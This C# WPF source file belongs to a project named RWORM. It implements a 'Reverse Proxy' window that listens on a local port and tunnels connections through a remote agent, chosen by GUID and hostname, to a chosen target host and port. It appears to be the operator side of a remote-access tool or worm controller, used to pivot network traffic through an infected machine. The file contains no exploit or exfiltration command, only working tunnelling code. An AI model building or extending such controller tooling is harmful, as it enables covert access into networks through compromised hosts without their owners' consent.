using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class ReverseProxyWindow : Window
    {
        private class LocalProxyClient : IDisposable
        {
            public int ChannelId { get; }
            public TcpClient Tcp { get; }
            public NetworkStream Stream { get; }
            public CancellationTokenSource Cts { get; }
            public SemaphoreSlim SendLock { get; }
            private int _disposed;

            public bool IsDisposed => Volatile.Read(ref _disposed) != 0;

            public LocalProxyClient(int channelId, TcpClient tcp, NetworkStream stream)
            {
                ChannelId = channelId;
                Tcp = tcp;
                Stream = stream;
                Cts = new CancellationTokenSource();
                SendLock = new SemaphoreSlim(1, 1);
            }

            public void Dispose()
            {
                if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
                try { Cts.Cancel(); } catch { }
                try { Stream.Dispose(); } catch { }
                try { Tcp.Close(); } catch { }
                try { Cts.Dispose(); } catch { }
                try { SendLock.Dispose(); } catch { }
            }
        }

        private readonly ServerConnection _server;
        private readonly string _guid;
        private TcpListener? _listener;
        private CancellationTokenSource? _cts;
        private readonly ConcurrentDictionary<int, LocalProxyClient> _clients = new();
        private int _channelCounter = 100;
        private volatile bool _running = false;
        private int _totalBytesForwarded = 0;

        public ReverseProxyWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Reverse Proxy — {hostname}";
            TitleLabel.Text = $"Reverse Proxy — {hostname}";

            _server.RegisterProxyDataHandler(_guid, OnProxyDataFromClient);
            Closed += (s, e) => StopProxy();
        }

        private void Log(string msg)
        {
            try
            {
                Dispatcher.Invoke(() =>
                {
                    TxtLogs.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
                    TxtLogs.ScrollToEnd();
                });
            }
            catch { }
        }

        private void Toggle_Click(object sender, RoutedEventArgs e)
        {
            if (_running)
            {
                StopProxy();
            }
            else
            {
                if (!int.TryParse(TxtLocalPort.Text.Trim(), out int port) || port < 1 || port > 65535)
                {
                    MessageBox.Show("Please enter a valid local port (1-65535).", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }
                string target = TxtTarget.Text.Trim();
                if (string.IsNullOrEmpty(target) || !target.Contains(':'))
                {
                    MessageBox.Show("Please enter target as host:port (e.g. 127.0.0.1:80).", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                StartProxy(port, target);
            }
        }

        private void StartProxy(int port, string target)
        {
            try
            {
                _cts = new CancellationTokenSource();
                _listener = new TcpListener(IPAddress.Loopback, port);
                _listener.Start();
                _running = true;

                BtnToggle.Content = "⏹ Stop Proxy";
                BtnToggle.Style = (Style)FindResource("DangerButton");
                TxtLocalPort.IsEnabled = false;
                TxtTarget.IsEnabled = false;
                StatusLabel.Text = $"Listening on 127.0.0.1:{port} -> forwarding through client to {target}";
                Log($"Proxy server listening on 127.0.0.1:{port}. Forward target: {target}");

                _ = AcceptLoopAsync(target, _cts.Token);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to bind port {port}: {ex.Message}", "Proxy Error", MessageBoxButton.OK, MessageBoxImage.Error);
                StopProxy();
            }
        }

        private async Task AcceptLoopAsync(string target, CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && _listener != null && _running)
            {
                try
                {
                    var incoming = await _listener.AcceptTcpClientAsync(ct);
                    incoming.NoDelay = true;
                    int chan = Interlocked.Increment(ref _channelCounter);
                    var client = new LocalProxyClient(chan, incoming, incoming.GetStream());
                    _clients[chan] = client;

                    Log($"[Channel #{chan}] Local inbound connection accepted from {incoming.Client.RemoteEndPoint}");

                    // Initiate tunnel on remote agent
                    await _server.ProxyStart(_guid, chan, target);

                    // Pump local stream to remote agent
                    _ = PumpLocalToRemoteAsync(client, ct);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    if (_running)
                    {
                        Log($"[Accept Error] {ex.Message}");
                    }
                    break;
                }
            }
        }

        private async Task PumpLocalToRemoteAsync(LocalProxyClient client, CancellationToken ct)
        {
            byte[] buf = new byte[8192];
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(ct, client.Cts.Token);
            var token = linkedCts.Token;

            try
            {
                while (!token.IsCancellationRequested && _running && client.Tcp.Connected)
                {
                    int read = await client.Stream.ReadAsync(buf, 0, buf.Length, token);
                    if (read <= 0) break;

                    byte[] chunk = new byte[read];
                    Buffer.BlockCopy(buf, 0, chunk, 0, read);

                    await _server.ProxySend(_guid, client.ChannelId, chunk);
                    Interlocked.Add(ref _totalBytesForwarded, read);
                }
            }
            catch
            {
                // Connection teardown
            }
            finally
            {
                CloseChannel(client.ChannelId, notifyRemote: true);
            }
        }

        private void OnProxyDataFromClient(byte[] data, int chan)
        {
            if (data == null || data.Length == 0) return;

            if (_clients.TryGetValue(chan, out var client) && !client.IsDisposed && client.Tcp.Connected)
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        await client.SendLock.WaitAsync(client.Cts.Token);
                        try
                        {
                            await client.Stream.WriteAsync(data, 0, data.Length, client.Cts.Token);
                            await client.Stream.FlushAsync(client.Cts.Token);
                        }
                        finally
                        {
                            client.SendLock.Release();
                        }
                    }
                    catch
                    {
                        CloseChannel(chan, notifyRemote: true);
                    }
                });
            }
        }

        private void CloseChannel(int chan, bool notifyRemote)
        {
            if (_clients.TryRemove(chan, out var client))
            {
                client.Dispose();
                Log($"[Channel #{chan}] Channel closed.");

                if (notifyRemote && _running)
                {
                    try
                    {
                        _ = _server.ProxyStop(_guid, chan);
                    }
                    catch { }
                }
            }
        }

        private void StopProxy()
        {
            if (!_running) return;
            _running = false;

            try { _cts?.Cancel(); } catch { }
            try { _listener?.Stop(); } catch { }
            _listener = null;

            foreach (var kvp in _clients)
            {
                if (_clients.TryRemove(kvp.Key, out var client))
                {
                    client.Dispose();
                    try { _ = _server.ProxyStop(_guid, kvp.Key); } catch { }
                }
            }
            _clients.Clear();

            _server.UnregisterProxyDataHandler(_guid);

            try
            {
                Dispatcher.Invoke(() =>
                {
                    BtnToggle.Content = "▶ Start Proxy";
                    BtnToggle.Style = (Style)FindResource("PrimaryButton");
                    TxtLocalPort.IsEnabled = true;
                    TxtTarget.IsEnabled = true;
                    StatusLabel.Text = "Proxy stopped.";
                    Log("Proxy stopped.");
                });
            }
            catch { }
        }
    }
}
